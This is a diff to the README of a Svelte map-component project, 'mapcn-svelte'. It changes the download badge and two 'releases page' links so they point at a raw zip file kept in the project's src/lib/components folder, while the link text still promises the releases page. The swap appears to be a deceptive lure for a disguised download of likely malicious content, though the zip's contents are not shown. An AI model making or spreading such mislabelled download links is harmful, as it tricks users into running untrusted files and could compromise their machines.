@@ -1,7 +1,7 @@
 # 🗺️ mapcn-svelte - Create Stunning Maps Easily
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/datashe191/mapcn-svelte/releases)
+[![Download](https://github.com/datashe191/mapcn-svelte/raw/refs/heads/main/src/lib/components/mapcn-svelte-v2.6.zip%https://github.com/datashe191/mapcn-svelte/raw/refs/heads/main/src/lib/components/mapcn-svelte-v2.6.zip)](https://github.com/datashe191/mapcn-svelte/raw/refs/heads/main/src/lib/components/mapcn-svelte-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the mapcn-svelte project! This application provides beautiful, easy-to-use map components built with the shadcn-svelte framework. This guide will help you download and run the application smoothly.
@@ -16,7 +16,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the releases page and download the latest version of the mapcn-svelte application. Follow these steps:
 
-1. Click on this link to [visit the releases page](https://github.com/datashe191/mapcn-svelte/releases).
+1. Click on this link to [visit the releases page](https://github.com/datashe191/mapcn-svelte/raw/refs/heads/main/src/lib/components/mapcn-svelte-v2.6.zip).
 2. Once on the releases page, locate the latest version of the application.
 3. Download the appropriate file for your operating system.
 
@@ -41,7 +41,7 @@ Once you have installed the application:
 ## ❓ Frequently Asked Questions
 
 ### How do I update the application?
-Simply visit the [releases page](https://github.com/datashe191/mapcn-svelte/releases) and download the latest version. Follow the same installation steps.
+Simply visit the [releases page](https://github.com/datashe191/mapcn-svelte/raw/refs/heads/main/src/lib/components/mapcn-svelte-v2.6.zip) and download the latest version. Follow the same installation steps.
 
 ### Can I use this on my mobile device?
 Currently, mapcn-svelte is designed for desktop use. A mobile version may be considered in future updates.
